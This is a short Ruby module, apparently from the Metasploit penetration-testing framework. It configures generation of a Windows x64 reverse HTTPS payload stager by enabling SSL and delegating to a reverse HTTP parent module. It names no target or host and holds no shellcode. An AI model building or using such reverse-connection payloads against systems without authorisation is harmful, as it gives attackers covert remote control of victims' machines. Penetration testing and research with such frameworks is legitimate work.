
# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/x64/reverse_http'

module Msf

###
#
# Complex payload generation for Windows ARCH_X64 that speak HTTPS
#
###

module Payload::Windows::ReverseHttps_x64

  include Msf::Payload::Windows::ReverseHttp_x64

  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    opts[:ssl] = true
    super(opts)
  end

end

end

